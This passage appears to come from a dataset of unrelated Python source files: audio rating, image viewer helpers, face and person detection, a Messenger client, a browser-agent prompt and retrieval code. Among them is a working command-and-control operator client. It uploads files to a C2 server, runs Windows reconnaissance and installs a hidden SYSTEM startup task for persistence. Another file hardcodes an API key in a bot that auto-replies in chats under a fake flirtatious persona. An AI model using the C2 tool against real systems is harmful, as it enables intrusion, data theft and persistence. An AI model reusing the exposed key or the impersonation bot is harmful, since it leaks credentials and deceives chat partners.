\u83b7\u53d6prompt\u6587\u4ef6\u5939\u4e0b\u7684\u97f3\u9891\u6587\u4ef6\n        self.prompt_files = sorted([os.path.join(self.prompt_floder, file) for file in os.listdir(self.prompt_floder)])\n        # \u786e\u4fdd\u6240\u6709\u6a21\u578b\u6587\u4ef6\u5939\u7684\u97f3\u9891\u6570\u91cf\u4e0eprompt\u4e00\u81f4\n        min_length = min(len(self.prompt_files), *(len(files) for files in self.model_files.values()))\n        self.prompt_files = self.prompt_files[:min_length]\n        for folder in self.model_folders:\n            self.model_files[folder] = self.model_files[folder][:min_length]\n        \n        # \u4e3a\u6bcf\u4e2a\u97f3\u9891\u7ec4\u521b\u5efa\u968f\u673a\u987a\u5e8f\n        self.audio_order = []\n        for i in range(len(self.prompt_files)):\n            models = [(self.model_files[folder][i], folder, idx) for idx, folder in enumerate(self.model_folders, start=1)]\n            random.shuffle(models)\n            self.audio_order.append(models)\n\n        print(self.audio_order)\n\n        # \u6dfb\u52a0\u5df2\u4f7f\u7528ID\u7684\u96c6\u5408\n        self.used_ids = set()\n        # \u5982\u679cresults.csv\u5b58\u5728\uff0c\u8bfb\u53d6\u6240\u6709\u5df2\u4f7f\u7528\u7684ID\n        if os.path.exists('results.csv'):\n            try:\n                with open('results.csv', 'r') as f:\n                    # \u8df3\u8fc7\u8868\u5934\n                    next(f, None)\n                    for line in f:\n                        if line.strip():\n                            # \u83b7\u53d6\u6bcf\u884c\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\uff08ID\uff09\n                            used_id = line.split(',')[0]\n                            self.used_ids.add(used_id)\n            except Exception as e:\n                print(f\"\u8bfb\u53d6results.csv\u65f6\u51fa\u9519: {e}\")\n\n    def initialize_state(self):\n        return {\n            \"index\": 0,\n            \"selected_MOS\": {folder: [] for folder in self.model_folders},  # \u5404\u6a21\u578b\u7684\u8bc4\u5206\n            \"tester_id\": \"\",\n            \"data_store\": {}\n        }\n\n    def submit_options(self, state, *options):\n        if not state[\"tester_id\"]:\n            return (\n                *([None] * (1 + len(self.model_folders))),\n                \"\u8bf7\u5148\u8f93\u5165\u60a8\u7684\u6d4b\u8bd5\u8005ID\",\n                *([0.5] * len(self.model_folders)),\n                state\n            )\n        \n        if state[\"index\"] >= len(self.prompt_files):\n            return (\n                *([None] * (1 + len(self.model_folders))),\n                \"## \u6d4b\u8bc4\u5df2\u7ecf\u7ed3\u675f\uff01\u611f\u8c22\u60a8\u7684\u53cd\u9988\uff01\\n## \",\n                *([0.5] * len(self.model_folders)),\n                state\n            )\n        \n        # \u68c0\u67e5\u6240\u6709\u8bc4\u5206\u662f\u5426\u90fd\u5df2\u9009\u62e9\n        if 0.5 in options:\n            current_audios = self.audio_order[state[\"index\"]]\n            return (\n                *(audio[0] for audio in current_audios),  # \u5404\u6a21\u578b\u7684\u97f3\u9891\n                self.prompt_files[state[\"index\"]],\n                \"#### \u65e0\u6548\u63d0\u4ea4\uff01\u8bf7\u4e3a\u6240\u6709\u97f3\u9891\u9009\u62e9\u8bc4\u5206\u540e\u518d\u63d0\u4ea4\",\n                *options,\n                state\n            )\n\n        # \u6839\u636e\u968f\u673a\u987a\u5e8f\u8bb0\u5f55\u8bc4\u5206\n        current_order = self.audio_order[state[\"index\"]]\n        for i, (_, folder, _) in enumerate(current_order):\n            state[\"selected_MOS\"][folder].append(options[i])\n\n        state[\"index\"] += 1\n        self.save_state(state)  # \u4fdd\u5b58\u66f4\u65b0\u540e\u7684\u72b6\u6001\n        \n        if state[\"index\"] < len(self.prompt_files):\n            next_audios = self.audio_order[state[\"index\"]]\n            return (\n                *(audio[0] for audio in next_audios),  # \u5404\u6a21\u578b\u7684\u97f3\u9891\n                self.prompt_files[state[\"index\"]],\n                f\"#### \u60a8\u6b63\u5728\u8bc4\u4ef7\u7b2c {state['index']+1} \u7ec4\u97f3\u9891\uff0c\u5171 {str(len(self.prompt_files))} \u7ec4\u3002\u63d0\u4ea4\u540e\u8bf7\u5411\u4e0a\u6eda\u52a8\u6536\u542c\u65b0\u7684\u97f3\u9891\",\n                *([0.5] * len(self.model_folders)),\n                state\n            )\n        else:\n            # \u4fdd\u5b58\u6240\u6709\u8bc4\u5206\u7ed3\u679c\u4e3aCSV\u683c\u5f0f\n            file_exists = os.path.isfile('results.csv')\n            self.used_ids.add(state[\"tester_id\"])\n            with open('results.csv', 'a') as f:\n                if not file_exists:\n                    header = \"id,model,\" + \",\".join([f\"MOS{i+1}\" for i in range(len(self.prompt_files))])\n                    f.write(header + \"\\n\")\n                \n                tester_id = state[\"tester_id\"]\n                for folder in self.model_folders:\n                    scores = \",\".join(map(str, state[\"selected_MOS\"][folder]))\n                    f.write(f\"{tester_id},{folder},{scores}\\n\")\n            \n            return (\n                *([None] * (1 + len(self.model_folders))),\n                \"## \u611f\u8c22\u60a8\u7684\u53cd\u9988\uff01\u60a8\u7684\u6d4b\u8bc4\u6570\u636e\u5df2\u4fdd\u5b58\",\n                *([0.5] * len(self.model_folders)),\n                state\n            )\n\n    d",
    "import subprocess\n\ndef send_command_to_server(command, server_url):\n    try:\n        # command structure\n        curl_command = [\n            \"curl\",\n            \"-X\", \"POST\",\n            \"-d\", f\"command={command}\",\n            f\"{server_url}/set_command\"\n        ]\n        # execution and output\n        result = subprocess.run(curl_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        if result.returncode == 0:\n            print(f\"Server output: {result.stdout.strip()}\")\n        else:\n            print(f\"Error: {result.stderr.strip()}\")\n    except Exception as e:\n        print(f\"Errore: {e}\")\n\ndef main():\n    server_url = input(\"Insert the C2 url (ex. http://127.0.0.1:80): \").strip()\n    \n    while True:\n        print(\"\\nMenu:\")\n        print(\"1. Exit\")\n        print(\"2. New command\")\n        print(\"3. Upload from win\")\n        print(\"4. Win audit\")\n        print(\"5. Install task\")\n        \n        choice = input(\"Select an option: \").strip()\n        \n        if choice == \"1\":\n            print(\"Exit...\")\n            break\n        elif choice == \"2\": # custom command\n            command = input(\"New command: \").strip()\n            if command:\n                send_command_to_server(command, server_url)\n            else:\n                print(\"Error!\")\n        elif choice == \"3\": # upload file to C2\n            file_path = input(\"Enter the full file path to upload: \").strip()\n            if file_path:\n                upload_command = \"curl -F file=@{} {}/upload_file\".format(file_path, server_url)\n                send_command_to_server(upload_command, server_url)\n            else:\n                print(\"Error: File path is empty!\")\n        elif choice == \"4\": # audit command\n            command = r'powershell -c ipconfig /all; netstat -ano; whoami; whoami /priv; dir c:\\Users; systeminfo; tasklist;'\n            if command:\n                send_command_to_server(command, server_url)\n            else:\n                print(\"Error!\")\n        elif choice == \"5\": # install task\n            script_path = input(\"Enter the full script path: \").strip()\n            if script_path:\n                command = 'powershell -c $script_path=\"{}\"; $action=New-ScheduledTaskAction -Execute python.exe -Argument $script_path; $trigger=New-ScheduledTaskTrigger -AtStartup -Delay \"00:02:00\"; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden;Register-ScheduledTask -TaskName Update00 -Action $action -Trigger $trigger -Settings $settings -User \"SYSTEM\" -RunLevel Highest;'.format(script_path)\n                send_command_to_server(command, server_url)\n            else:\n                print(\"Error!\")\n        else:\n            print(\"Error!\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# http://localhost:8080/login\r\n\r\nfrom flask import Flask, request, render_template_string\r\n# pip install Flask\r\napp = Flask(__name__)\r\n\r\n# Example regex validation (for demonstration purposes, not secure)\r\nimport re\r\n\r\n# Regex pattern for username validation (this is where the vulnerability might lie)\r\nUSERNAME_PATTERN = r\"^[a-zA-Z0-9_]+$\"  # Only allows alphanumeric characters and underscores, at least one character long\r\n\r\n\r\n# In-memory storage for a single user (for demo purposes)\r\nusers = {\r\n    \"administrator_\": \"admin_123\"  # Example user (username: administrator_, password: admin_123)\r\n}\r\n\r\n@app.route('/login', methods=['GET', 'POST'])\r\n# This line creates a route in the Flask application that listens for requests to the URL '/login'.\r\n# The 'methods' argument specifies that this route can handle both GET and POST HTTP requests.\r\n# - GET: Used when the user initially visits the login page. The server responds by rendering the login form.\r\n# - POST: Used when the user submits the login form with their username and password. The server processes this data to authenticate the user.\r\ndef login():\r\n    if request.method == 'POST':\r\n        username = request.form['username']\r\n        password = request.form['password']\r\n        \r\n        # Validate the username against the regex pattern\r\n        if not re.match(USERNAME_PATTERN, username):\r\n            return \"Invalid username format!\"\r\n\r\n        # Check if the username exists and the password matches\r\n        if username in users and users[username] == password:\r\n            return \"Welcome, \" + username + \"!\"\r\n        else:\r\n            return \"Invalid username or password!\"\r\n\r\n    # Render a simple login form\r\n    return render_template_string('''\r\n        <style>\r\n            /* Center the form on the page */\r\n            form {\r\n                margin: 100px auto;\r\n                width: 300px;\r\n                padding: 20px;\r\n                border: 1px solid #ccc;\r\n                border-radius: 10px;\r\n                background-color: #f9f9f9;\r\n            }\r\n            \r\n            /* Style the input fields */\r\n            input[type=\"text\"], input[type=\"password\"] {\r\n                width: 100%;\r\n                padding: 10px;\r\n                margin: 5px 0 15px 0;\r\n                border: 1px solid #ccc;\r\n                border-radius: 5px;\r\n                box-sizing: border-box;\r\n            }\r\n            \r\n            /* Style the submit button */\r\n            input[type=\"submit\"] {\r\n                width: 100%;\r\n                padding: 10px;\r\n                background-color: #4CAF50;\r\n                color: white;\r\n                border: none;\r\n                border-radius: 5px;\r\n                cursor: pointer;\r\n            }\r\n            \r\n            input[type=\"submit\"]:hover {\r\n                background-color: #45a049;\r\n            }\r\n        </style>\r\n        \r\n        <form method=\"post\">\r\n            <label for=\"username\">Username:</label>\r\n            <input type=\"text\" id=\"username\" name=\"username\"><br>\r\n\r\n            <label for=\"password\">Password:</label>\r\n            <input type=\"password\" id=\"password\" name=\"password\"><br>\r\n            \r\n            <input type=\"submit\" value=\"Login\">\r\n        </form>\r\n    ''')\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='localhost', port=8080)\r\n",
    "from contextlib import contextmanager\nfrom typing import Any, Generator, Sequence\n\nimport napari\nimport numpy as np\nfrom napari.layers import Layer\nfrom vispy.color import ColorArray\n\n\ndef color2rgba(color: ColorArray | np.ndarray, factor: int = 255) -> str:\n    \"\"\"\n    Convert a vispy color to an SVG-compatible RGBA string.\n\n    Parameters\n    ----------\n    color : ColorArray | np.ndarray\n        The vispy or array color to convert.\n    factor : int\n        The factor to multiply the color values by.\n\n    Returns\n    -------\n    str\n        The SVG-compatible RGBA string.\n    \"\"\"\n    return \"rgba({}, {}, {}, {})\".format(*(color[:4] * factor))\n\n\n@contextmanager\ndef hide_all(\n    viewer: napari.Viewer, ignore: Any | Sequence[Any]\n) -> Generator[None, None, None]:\n\n    elements = {}\n    ignore = {ignore} if isinstance(ignore, Layer) else set(ignore)\n\n    for layer in viewer.layers:\n        if layer in ignore:\n            continue\n        elements[layer] = layer.visible\n        layer.visible = False\n\n    for layer in viewer._overlays.values():\n        if layer in ignore:\n            continue\n        elements[layer] = layer.visible\n        layer.visible = False\n\n    yield\n\n    for layer, status in elements.items():\n        layer.visible = status\n\n\n@contextmanager\ndef fit_canvas_to_content(\n    viewer: napari.Viewer,\n) -> Generator[None, None, None]:\n    \"\"\"\n    Fit the canvas to the content of a napari viewer.\n\n    Modified from: https://github.com/napari/napari/blob/main/napari/_qt/qt_main_window.py#L1660\n\n    Parameters\n    ----------\n    viewer : napari.Viewer\n        The napari viewer to fit the canvas to the content.\n    \"\"\"\n    ndisplay = viewer.dims.ndisplay\n    if ndisplay > 2:\n        raise ValueError(\"Fit content is only available in 2D mode.\")\n\n    prev_size = viewer.window._qt_viewer.canvas.size\n    prev_zoom = viewer.camera.zoom\n    prev_center = viewer.camera.center\n\n    extent_world = viewer.layers.extent.world[1][-ndisplay:]\n    extent_step = min(viewer.layers.extent.step[-ndisplay:])\n    size = extent_world / extent_step + 1\n    size = np.asarray(size) / viewer.window._qt_window.devicePixelRatio()\n\n    viewer.window._qt_viewer.canvas.size = size.astype(int)\n    viewer.reset_view(margin=0)\n\n    yield\n\n    viewer.window._qt_viewer.canvas.size = prev_size\n    viewer.camera.zoom = prev_zoom\n    viewer.camera.center = prev_center\n",
    "import cv2\n\nrecognizer = cv2.face.LBPHFaceRecognizer_create() # Local Binary Patterns Histograms\nrecognizer.read('trainer/trainer.yml')   #load trained model\ncascadePath = \"haarcascade_frontalface_default.xml\"\nfaceCascade = cv2.CascadeClassifier(cascadePath) #initializing haar cascade for object detection approach\n\nfont = cv2.FONT_HERSHEY_SIMPLEX #denotes the font type\n\n\nid = 2 #number of persons you want to Recognize\n\n\nnames = ['Sam','']\n\n\ncam = cv2.VideoCapture(0, cv2.CAP_V4L2) #cv2.CAP_V4L2 to try a different capture method\ncam.set(3, 640) # set video FrameWidht\ncam.set(4, 480) # set video FrameHeight\n\n# Define min window size to be recognized as a face\nminW = 0.1*cam.get(3)\nminH = 0.1*cam.get(4)\n\n# flag = True\n\nwhile True:\n\n    ret, img =cam.read() #read the frames using the above created object\n    if not ret:\n        continue\n    converted_image = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)  #The function converts an input image from one color space to another\n\n    faces = faceCascade.detectMultiScale( \n        converted_image,\n        scaleFactor = 1.2,\n        minNeighbors = 5,\n        minSize = (int(minW), int(minH)),\n       )\n\n    for(x,y,w,h) in faces:\n\n        cv2.rectangle(img, (x,y), (x+w,y+h), (0,255,0), 2) #used to draw a rectangle on any image\n\n        id, accuracy = recognizer.predict(converted_image[y:y+h,x:x+w]) #to predict on every single image\n\n        # Check if accuracy is less them 100 ==> \"0\" is perfect match \n        if (accuracy < 100):\n            id = names[id]\n            accuracy = \"  {0}%\".format(round(100 - accuracy))\n\n        else:\n            id = \"unknown\"\n            accuracy = \"  {0}%\".format(round(100 - accuracy))\n        \n        cv2.putText(img, str(id), (x+5,y-5), font, 1, (255,255,255), 2)\n        cv2.putText(img, str(accuracy), (x+5,y+h-5), font, 1, (255,255,0), 1)  \n    \n    cv2.imshow('camera',img) \n\n    k = cv2.waitKey(10) & 0xff # Press 'ESC' for exiting video\n    if k == 27:\n        break\n\n# Do a bit of cleanup\ncam.release()\ncv2.destroyAllWindows()\n",
    "from __future__ import annotations\n\nimport aiomqtt\nimport paho.mqtt.client as mqtt\nimport random\nimport aiohttp\n\nfrom dataclasses import dataclass, field\nfrom typing import Any\nfrom yarl import URL\n\nfrom . import _graphql, _util\nfrom aiomqtt.exceptions import MqttConnectError\nfrom .n_state import State\n\n\n@dataclass(slots=True)\nclass Mqtt:\n    _state: State = field()\n    _mqttClient: aiomqtt.Client = field()\n    _chat_on: bool = field()\n    _foreground: bool = field()\n    _sequence_id: int = field()\n    _sync_token: Any = field(default=None)\n    _HOST = \"edge-chat.facebook.com\"\n\n\n    @classmethod\n    async def connect(cls, state: State, chat_on: bool, foreground: bool)-> Mqtt:\n\n        mqttClint = aiomqtt.Client(\n            hostname=cls._HOST,\n            identifier=\"mqttwsclient\",\n            clean_session=True,\n            protocol=aiomqtt.ProtocolVersion.V31,\n            transport=\"websockets\",\n            port=443,\n            keepalive=60\n        )\n        sequence_id = await cls._fetch_sequence_id(state)\n        # needed for websockets\n        mqttClint._client.tls_set()\n        # creating class instance \n        self = cls(\n            _state=state,\n            _mqttClient=mqttClint,\n            _chat_on=chat_on,\n            _foreground=foreground,\n            _sequence_id=sequence_id\n        )\n    \n        \n        self._configure_connect_options()\n        await mqttClint.__aenter__()\n        if self._mqttClient._client.is_connected():\n            await self._messenger_queue_publish()\n        return self\n\n    @staticmethod\n    async def _fetch_sequence_id(state)-> int:\n        \"\"\"Fetch sequence ID.\"\"\"\n        params = {\n            \"limit\": 1,\n            \"tags\": [\"INBOX\"],\n            \"before\": None,\n            \"includeDeliveryReceipts\": False,\n            \"includeSeqID\": True,\n            }\n        (j,) = await state._graphql_requests(_graphql.from_doc_id(\"1349387578499440\", params))\n        sequence_id = j[\"viewer\"][\"message_threads\"][\"sync_sequence_id\"] #type: ignore\n        return int(sequence_id)\n\n\n\n    def _configure_connect_options(self)-> None:\n        session_id = generate_session_id()\n        topics = [\n            \"/t_ms\",\n            \"/thread_typing\",\n            \"/orca_typing_notifications\",\n            \"/orca_presence\",\n            \"/legacy_web\", \"/br_sr\", \"/sr_res\",\n            \"/ls_req\",\n            \"/ls_resp\",\n            \"/webrtc\",\n            \"/onevc\",\n            \"/notify_disconnect\",\n            \"/mercury\",\n            \"/messaging_events\",\n            \"/orca_message_notifications\",\n            \"/pp\",\n            \"/webrtc_response\",\n        ]\n        username = {\n            \"u\": self._state.user_id,\n            \"s\": session_id,\n            \"chat_on\": self._chat_on,\n            \"fg\": self._foreground,\n            \"d\": self._state._client_id,\n            \"aid\": 219994525426954,\n            \"st\": topics,\n            \"pm\": [],\n            \"cp\": 3,\n            \"ecp\": 10,\n            \"ct\": \"websocket\",\n            \"mqtt_sid\": \"\",\n            \"dc\": \"\",\n            \"no_auto_fg\": True,\n            \"gas\": None,\n            \"pack\": [],\n        }\n        self._mqttClient._client.username_pw_set(_util.json_minimal(username))\n\n        headers = {\n            \"Cookie\": get_cookie_header(\n                self._state._session, \"https://edge-chat.facebook.com/chat\"\n            ),\n            \"User-Agent\": self._state._session.headers[\"User-Agent\"],\n            \"Origin\": \"https://www.facebook.com\",\n            \"Host\": self._HOST\n        }\n        self._mqttClient._client.ws_set_options(\n            path=f\"/chat?sid={session_id}\", headers=headers\n        )\n        \n    \n    async def _messenger_queue_publish(self)-> None:\n        # configure receiving messages.\n        payload = {\n            \"sync_api_version\": 10,\n            \"max_deltas_able_to_process\": 1000,\n            \"delta_batch_size\": 500,\n            \"encoding\": \"JSON\",\n            \"entity_fbid\": self._state.user_id,\n        }\n\n        if self._sync_token is None:\n            topic = \"/messenger_sync_create_queue\"\n            payload[\"initial_titan_sequence_id\"] = str(self._sequence_id)\n            payload[\"device_params\"] = None\n        else:\n            topic = \"/messenger_sync_get_diffs\"\n            payload[\"last_seq_id\"] = str(self._sequence_id)\n            payload[\"sync_token\"] = self._sync_token\n\n        await self._mqttClient.publish(topic, _util.json_minimal(payload), qos=1)\n\n    # def _on_connect_client(self, client, userdata, flags, reason_code) -> None:\n    #     \"\"\"Called when we receive a CONNACK message from the broker.\"\"\"\n    #     if self._mqttClient._connected.done():\n    #         pass\n    #     if reason_code == mqtt.CONNACK_ACCEPTED:\n    #         self._mqttClient._connected.set_result(None)\n    #     else:\n    #         # We received a negative CONNACK response\n    #         self._mqttClient._connected.set_exception(MqttConnectError(reason_code))\n\n\n    async def disconnect(self):\n        await self._mqttClient.__ae",
    "import pyautogui\nimport time\nimport pyperclip\nfrom groq import Groq\n\nclient = Groq(api_key=\"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\") # Initialize the Groq API client with the provided API key\n\n# Step 1: Click on the icon at (617, 1050)\npyautogui.click(617, 1050)\ntime.sleep(1)  # Wait for 1 second to ensure the action is completed\n\n# Step 2: Drag from (301, 215) to (1558, 973) to select text\npyautogui.moveTo(1007, 222)\npyautogui.dragTo(1686, 987, duration=0.5)\n\n# Step 3: Copy the selected text to the clipboard\npyautogui.hotkey('ctrl', 'c')\npyautogui.click()\ntime.sleep(0.5)  # Wait a moment to ensure the copy action is completed\n\n# Step 4: Store the clipboard content in a variable\nchatHistory = pyperclip.paste()\n\n# Step 5: Use the Groq API to generate a response\ncompletion = client.chat.completions.create(\n  model=\"llama3-70b-8192\",\n  messages=[\n    {\"role\": \"system\", \"content\": \"You are a person named Naruto who speaks bangla as well as english. You are from Bangladesh and you are a coder and flirter. You analyze chat history based on the last message of the chat and ensuring your response reflects your coding expertise and flirtatious, friendly nature. Output should be the next chat response (text message only)\"},\n    {\"role\": \"system\", \"content\": chatHistory}\n  ]\n)\nresponse = completion.choices[0].message.content\npyperclip.copy(response)\n\n# Step 5: Click at (600, 1006)\npyautogui.click(600, 1006)\ntime.sleep(0.5)  # Wait a moment to ensure the click is registered\n\n# Step 6: Paste the text and press Enter\npyautogui.hotkey('ctrl', 'v')\ntime.sleep(0.5)  # Wait a moment to ensure the paste action is completed\npyautogui.press('enter')\n\n# Print the text to verify\nprint(f\"Pasted text: {chatHistory}\")\n\n\n\n",
    "import torch\nimport numpy as np\nimport cv2\nfrom time import time\nfrom ultralytics import YOLO\n\nimport supervision as sv\n\n\nfrom phue import Bridge\n\nb = Bridge('192.168.178.91')\n\n\n# Get the bridge state (This returns the full dictionary that you can explore)\n#print(b.get_api())\n\n\nclass ObjectDetection:\n\n    def __init__(self, capture_index):\n\n        self.capture_index = capture_index\n\n        self.device = 'cuda' if torch.cuda.is_available() else 'cpu'\n\n        print(\"Using Device: \", self.device)\n\n        self.model = self.load_model()\n\n        self.CLASS_NAMES_DICT = self.model.model.names\n\n        self.box_annotator = sv.BoxAnnotator(color=sv.ColorPalette.DEFAULT, thickness=3)\n\n\n    def load_model(self):\n\n        model = YOLO(\"yolov8n.pt\")  # load a pretrained YOLOv8n model\n        model.fuse()\n\n        return model\n\n\n    def predict(self, frame):\n\n        results = self.model(frame)\n\n        return results\n\n\n    def plot_bboxes(self, results, frame):\n\n        xyxys = []\n        confidences = []\n        class_ids = []\n\n        # Get image dimensions (height, width)\n        height, width, _ = frame.shape\n\n        # Setup detections for visualization\n        detections = sv.Detections(\n            xyxy=results[0].boxes.xyxy.cpu().numpy(),\n            confidence=results[0].boxes.conf.cpu().numpy(),\n            class_id=results[0].boxes.cls.cpu().numpy().astype(int),\n        )\n\n        # Filter for person class (assuming class_id == 0 corresponds to person)\n        person_indices = [i for i, class_id in enumerate(detections.class_id) if class_id == 0]\n\n        # Filter detections\n        filtered_detections = sv.Detections(\n            xyxy=detections.xyxy[person_indices],\n            confidence=detections.confidence[person_indices],\n            class_id=detections.class_id[person_indices],\n        )\n\n        # Format custom labels for persons only\n        self.labels = [f\"{self.CLASS_NAMES_DICT[class_id]} {confidence:0.2f}\"\n                       for confidence, class_id in zip(filtered_detections.confidence, filtered_detections.class_id)]\n\n        # Annotate and display frame for persons only\n        frame = self.box_annotator.annotate(scene=frame, detections=filtered_detections)\n\n        # Control light based on the position of the detected person\n        for xyxy in filtered_detections.xyxy:\n            center_x = (xyxy[0] + xyxy[2]) / 2\n\n            if center_x > width / 2:  # Right side of the image\n                b.set_light('Hue color candle 1', 'on', True)\n                b.set_light('Hue color candle 2', 'on', False)\n            else:  # Left side of the image\n                b.set_light('Hue color candle 1', 'on', False)\n                b.set_light('Hue color candle 2', 'on', True)\n\n        return frame\n\n\n\n    def __call__(self):\n\n        cap = cv2.VideoCapture(0)\n        assert cap.isOpened()\n        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)\n        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)\n\n        while True:\n\n            start_time = time()\n\n            ret, frame = cap.read()\n            assert ret\n\n            results = self.predict(frame)\n            frame = self.plot_bboxes(results, frame)\n\n            end_time = time()\n            fps = 1/np.round(end_time - start_time, 2)\n\n            cv2.putText(frame, f'FPS: {int(fps)}', (20,70), cv2.FONT_HERSHEY_SIMPLEX, 1.5, (0,255,0), 2)\n\n            cv2.imshow('YOLOv8 Detection', frame)\n\n            if cv2.waitKey(5) & 0xFF == 27:\n\n                break\n\n        cap.release()\n        cv2.destroyAllWindows()\n\n\n\ndetector = ObjectDetection(capture_index=2)\ndetector()",
    "import pdb\nfrom typing import List, Optional\n\nfrom browser_use.agent.prompts import SystemPrompt, AgentMessagePrompt\nfrom browser_use.agent.views import ActionResult, ActionModel\nfrom browser_use.browser.views import BrowserState\nfrom langchain_core.messages import HumanMessage, SystemMessage\n\nfrom .custom_views import CustomAgentStepInfo\n\n\nclass CustomSystemPrompt(SystemPrompt):\n    def important_rules(self) -> str:\n        \"\"\"\n        Returns the important rules for the agent.\n        \"\"\"\n        text = r\"\"\"\n    1. RESPONSE FORMAT: You must ALWAYS respond with valid JSON in this exact format:\n       {\n         \"current_state\": {\n           \"prev_action_evaluation\": \"Success|Failed|Unknown - Analyze the current elements and the image to check if the previous goals/actions are successful like intended by the task. Ignore the action result. The website is the ground truth. Also mention if something unexpected happened like new suggestions in an input field. Shortly state why/why not. Note that the result you output must be consistent with the reasoning you output afterwards. If you consider it to be 'Failed,' you should reflect on this during your thought.\",\n           \"important_contents\": \"Output important contents closely related to user\\'s instruction on the current page. If there is, please output the contents. If not, please output empty string ''.\",\n           \"task_progress\": \"Task Progress is a general summary of the current contents that have been completed. Just summarize the contents that have been actually completed based on the content at current step and the history operations. Please list each completed item individually, such as: 1. Input username. 2. Input Password. 3. Click confirm button. Please return string type not a list.\",\n           \"future_plans\": \"Based on the user's request and the current state, outline the remaining steps needed to complete the task. This should be a concise list of actions yet to be performed, such as: 1. Select a date. 2. Choose a specific time slot. 3. Confirm booking. Please return string type not a list.\",\n           \"thought\": \"Think about the requirements that have been completed in previous operations and the requirements that need to be completed in the next one operation. If your output of prev_action_evaluation is 'Failed', please reflect and output your reflection here.\",\n           \"summary\": \"Please generate a brief natural language description for the operation in next actions based on your Thought.\"\n         },\n         \"action\": [\n           * actions in sequences, please refer to **Common action sequences**. Each output action MUST be formated as: \\{action_name\\: action_params\\}* \n         ]\n       }\n\n    2. ACTIONS: You can specify multiple actions to be executed in sequence. \n\n       Common action sequences:\n       - Form filling: [\n           {\"input_text\": {\"index\": 1, \"text\": \"username\"}},\n           {\"input_text\": {\"index\": 2, \"text\": \"password\"}},\n           {\"click_element\": {\"index\": 3}}\n         ]\n       - Navigation and extraction: [\n           {\"go_to_url\": {\"url\": \"https://example.com\"}},\n           {\"extract_page_content\": {}}\n         ]\n\n\n    3. ELEMENT INTERACTION:\n       - Only use indexes that exist in the provided element list\n       - Each element has a unique index number (e.g., \"33[:]<button>\")\n       - Elements marked with \"_[:]\" are non-interactive (for context only)\n\n    4. NAVIGATION & ERROR HANDLING:\n       - If no suitable elements exist, use other functions to complete the task\n       - If stuck, try alternative approaches\n       - Handle popups/cookies by accepting or closing them\n       - Use scroll to find elements you are looking for\n\n    5. TASK COMPLETION:\n       - If you think all the requirements of user\\'s instruction have been completed and no further operation is required, output the **Done** action to terminate the operation process.\n       - Don't hallucinate actions.\n       - If the task requires specific information - make sure to include everything in the done function. This is what the user will see.\n       - If you are running out of steps (current step), think about speeding it up, and ALWAYS use the done action as the last action.\n       - Note that you must verify if you've truly fulfilled the user's request by examining the actual page content, not just by looking at the actions you output but also whether the action is executed successfully. Pay particular attention when errors occur during action execution.\n\n    6. VISUAL CONTEXT:\n       - When an image is provided, use it to understand the page layout\n       - Bounding boxes with labels correspond to element indexes\n       - Each bounding box and its label have the same color\n       - Most often the label is inside the bounding box, on the top right\n       - Visual context helps verify element locations and relationships\n       - sometimes labels overlap, so use the context to verify the correct element\n\n    7. Form filling:\n       - If you",
    "import itertools\nfrom scipy.stats import ks_2samp\nfrom sklearn.neighbors import NearestNeighbors\nrng = np.random.default_rng()\nfrom dadapy import Data\nfrom dadapy._utils import utils as ut\nimport os\nfrom scipy.spatial import distance\nfrom sentence_transformers import SentenceTransformer, util\n\nimport numpy as np\nfrom scipy.spatial import distance\nfrom scipy.stats import ks_2samp\nimport torch.nn.functional as F\nfrom sentence_transformers import util\n\nclass AdaptiveRetrieval:\n    def __init__(self, data, embeddings):\n        \"\"\"\n        Initialize the EmbeddingAnalyzer with data and embeddings.\n        \n        Args:\n            data: Data object containing required methods (compute_id_2NN, compute_distances, set_id)\n            embeddings: numpy array of embeddings\n        \"\"\"\n        self.data = data\n        self.embeddings = embeddings\n        self.rng = np.random.default_rng()\n        self.N = len(embeddings)\n        self.distances = None\n        self.intrinsic_dim = None\n        self.intrinsic_dim_err = None\n        self.intrinsic_dim_scale = None\n        self.kstar = None\n\n    def compute_kstar_binomial_id(self, initial_id=None, Dthr=23, r='opt', n_iter=10):\n        \"\"\"\n        Compute k* and binomial ID estimation.\n        \n        Args:\n            initial_id: Initial intrinsic dimension estimate\n            Dthr: Distance threshold\n            r: Ratio parameter ('opt' for automatic or float value)\n            n_iter: Number of iterations\n            \n        Returns:\n            tuple: (ids, kstars) for the final iteration\n        \"\"\"\n        if initial_id is None:\n            self.data.compute_id_2NN(algorithm='base')\n        else:\n            self.data.compute_distances()\n            self.data.set_id(initial_id)\n\n        ids = np.zeros(n_iter)\n        ids_err = np.zeros(n_iter)\n        kstars = np.zeros((n_iter, self.N), dtype=int)\n        log_likelihoods = np.zeros(n_iter)\n        ks_stats = np.zeros(n_iter)\n        p_values = np.zeros(n_iter)\n\n        for i in range(n_iter):\n            # Compute kstar\n            self.data.compute_kstar(Dthr)\n            \n            # Set new ratio\n            r_eff = min(0.95, 0.2032**(1./self.data.intrinsic_dim)) if r == 'opt' else r\n            \n            # Compute neighbourhood shells from k_star\n            rk = np.array([dd[self.data.kstar[j]] for j, dd in enumerate(self.data.distances)])\n            rn = rk * r_eff\n            n = np.sum([dd < rn[j] for j, dd in enumerate(self.data.distances)], axis=1)\n            \n            # Compute ID\n            id = np.log((n.mean() - 1) / (self.data.kstar.mean() - 1)) / np.log(r_eff)\n            \n            # Compute ID error\n            id_err = self._compute_binomial_cramerrao(id, self.data.kstar-1, r_eff, self.N)\n            \n            # Compute likelihood\n            log_lik = self._binomial_loglik(id, self.data.kstar - 1, n - 1, r_eff)\n            \n            # Model validation through KS test\n            n_model = self.rng.binomial(self.data.kstar-1, r_eff**id, size=len(n))\n            ks, pv = ks_2samp(n-1, n_model)\n            \n            # Set new ID\n            self.data.set_id(id)\n            ids[i] = id\n            ids_err[i] = id_err\n            kstars[i] = self.data.kstar\n            log_likelihoods[i] = log_lik\n            ks_stats[i] = ks\n            p_values[i] = pv\n\n        # Store final results\n        self.intrinsic_dim = id\n        self.intrinsic_dim_err = id_err\n        self.intrinsic_dim_scale = 0.5 * (rn.mean() + rk.mean())\n        \n        return ids, kstars[(n_iter - 1), :]\n\n    def 